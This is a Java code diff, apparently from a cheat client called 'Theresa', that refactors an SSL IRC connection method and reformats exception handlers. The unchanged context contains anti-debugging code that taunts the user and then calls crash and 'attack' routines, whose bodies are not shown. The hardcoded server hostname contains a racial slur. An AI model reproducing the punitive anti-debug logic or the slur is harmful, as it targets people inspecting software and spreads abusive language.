@@ -223,7 +223,8 @@ public class Main {
             Method printlnMethod = printStreamClass.getDeclaredMethod("println", String.class);
             Object object = outField.get(null);
             printlnMethod.invoke(object, obj);
-        } catch (ClassNotFoundException | InvocationTargetException | NoSuchMethodException | IllegalAccessException e) {
+        } catch (ClassNotFoundException | InvocationTargetException | NoSuchMethodException |
+                 IllegalAccessException e) {
             e.printStackTrace();
         }
     }
@@ -277,7 +278,8 @@ public class Main {
                             Class.forName("javax.swing.JOptionPane").getDeclaredMethod("showMessageDialog",
                                     java.awt.Component.class, Object.class, String.class, int.class).invoke(Class.forName("javax.swing.JOptionPane"),
                                     null, "NO DEBUG PLZ? " + "\n" + "Debugging is just skidding with extra work ;)", "Theresa.exe", 0);
-                        } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException | ClassNotFoundException e) {
+                        } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException |
+                                 ClassNotFoundException e) {
                             doCrash();
                             attack();
                         }
@@ -291,46 +293,52 @@ public class Main {
     }
 
     public Bootstrap bootstrap;
-
+    public Thread thread;
 
     private void IRC() {
         doLogin();
 
-        new Thread(() -> {
-            EventLoopGroup eventExecutors = new NioEventLoopGroup();
-            try {
-                bootstrap = new Bootstrap();
-                bootstrap.group(eventExecutors).channel(NioSocketChannel.class)
-                        .handler(new ChannelInitializer<SocketChannel>() {
-                            @Override
-                            protected void initChannel(SocketChannel socketChannel) {
-                                InputStream cChatPath = null;
-                                try {
-                                    String home = System.getProperty("user.home");
-                                    File keyDir = new File(home, "Theresa");
-                                    File privateKeyFile = new File(keyDir, name);
-                                    cChatPath = new FileInputStream(privateKeyFile.getAbsolutePath());
-                                } catch (FileNotFoundException e) {
-                                    println("Failed to load");
-                                    doCrash();
-                                }
-                                SSLEngine engine = SslOneWayContextFactory.getClientContext(cChatPath, "theresa" + name + "antileak")
-                                        .createSSLEngine();
-                                engine.setUseClientMode(true);//客户方模式
-                                socketChannel.pipeline().addLast("ssl", new SslHandler(engine));
-                                socketChannel.pipeline().addLast(new StringEncoder(StandardCharsets.UTF_8));
-                                socketChannel.pipeline().addLast(new StringDecoder(Charset.forName("GBK")));
-                                socketChannel.pipeline().addLast(new NettyClientHandler());
+        thread = new Thread(() -> {
+            ircLogin("my.nigger.party");
+        });
+
+        thread.start();
+    }
+
+    public void ircLogin(String ip) {
+        EventLoopGroup eventExecutors = new NioEventLoopGroup();
+        try {
+            bootstrap = new Bootstrap();
+            bootstrap.group(eventExecutors).channel(NioSocketChannel.class)
+                    .handler(new ChannelInitializer<SocketChannel>() {
+                        @Override
+                        protected void initChannel(SocketChannel socketChannel) {
+                            InputStream cChatPath = null;
+                            try {
+                                String home = System.getProperty("user.home");
+                                File keyDir = new File(home, "Theresa");
+                                File privateKeyFile = new File(keyDir, name);
+                                cChatPath = new FileInputStream(privateKeyFile.getAbsolutePath());
+                            } catch (FileNotFoundException e) {
+                                println("Failed to load");
+                                doCrash();
                             }
-                        });
-                cf = bootstrap.connect("my.nigger.party", 9822).sync();
-                println("Connected");
-                cf.channel().closeFuture().sync();
-            } catch (InterruptedException ignored) {
-            } finally {
-                println("Connecting lost");
-            }
-        }).start();
+                            SSLEngine engine = SslOneWayContextFactory.getClientContext(cChatPath, "theresa" + name + "antileak")
+                                    .createSSLEngine();
+                            engine.setUseClientMode(true);//客户方模式
+                            socketChannel.pipeline().addLast("ssl", new SslHandler(engine));
+                            socketChannel.pipeline().addLast(new StringEncoder(StandardCharsets.UTF_8));
+                            socketChannel.pipeline().addLast(new StringDecoder(Charset.forName("GBK")));
+                            socketChannel.pipeline().addLast(new NettyClientHandler());
+                        }
+                    });
+            cf = bootstrap.connect(ip, 9822).sync();
+            println("Connected");
+            cf.channel().closeFuture().sync();
+        } catch (InterruptedException ignored) {
+        } finally {
+            println("Connecting lost");
+        }
     }
 
     public void doLogin() {
